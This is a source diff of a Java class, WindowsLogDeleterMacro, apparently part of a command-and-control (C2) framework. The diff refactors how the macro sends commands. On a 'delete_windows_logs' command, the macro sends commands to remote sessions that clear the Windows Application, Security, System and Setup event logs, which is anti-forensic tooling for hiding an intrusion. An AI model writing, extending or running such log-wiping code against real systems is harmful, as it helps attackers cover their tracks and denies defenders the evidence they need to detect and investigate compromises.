@@ -6,8 +6,6 @@ import c2.win.WindowsCmdLineHelper;
 
 public class WindowsLogDeleterMacro extends AbstractCommandMacro {
 
-	private IOManager io;
-	
 	@Override
 	public boolean isCommandMatch(String cmd) {
 		if(cmd.startsWith("delete_windows_logs")) {
@@ -15,12 +13,6 @@ public class WindowsLogDeleterMacro extends AbstractCommandMacro {
 		}else {
 			return false;
 		}
-	}
-
-	@Override
-	public void initialize(IOManager io, HarvestProcessor harvestProcessor) {
-		this.io = io;
-		//Discard reference to harvest processor, it isn't needed.
 	}
 
 	@Override
@@ -69,26 +61,22 @@ public class WindowsLogDeleterMacro extends AbstractCommandMacro {
 	
 	private void clearApplicationLog(int sessionId, MacroOutcome outcome) {
 		String cmd = WINDOWS_LOG_CLEAR_CMD + APPLICATION_LOG_SUFFIX;
-		outcome.addSentCommand(cmd);
-		io.sendCommand(sessionId, cmd);
+		sendCommand(cmd, sessionId, outcome);
 	}
 	
 	private void clearSecurityLog(int sessionId, MacroOutcome outcome) {
 		String cmd = WINDOWS_LOG_CLEAR_CMD + SECURITY_LOG_SUFFIX;
-		outcome.addSentCommand(cmd);
-		io.sendCommand(sessionId, cmd);
+		sendCommand(cmd, sessionId, outcome);
 	}
 	
 	private void clearSystemLog(int sessionId, MacroOutcome outcome) {
 		String cmd = WINDOWS_LOG_CLEAR_CMD + SYSTEM_LOG_SUFFIX;
-		outcome.addSentCommand(cmd);
-		io.sendCommand(sessionId, cmd);
+		sendCommand(cmd, sessionId, outcome);
 	}
 	
 	private void clearSetupLog(int sessionId, MacroOutcome outcome) {
 		String cmd = WINDOWS_LOG_CLEAR_CMD + SETUP_LOG_SUFFIX;
-		outcome.addSentCommand(cmd);
-		io.sendCommand(sessionId, cmd);
+		sendCommand(cmd, sessionId, outcome);
 	}
 
 }
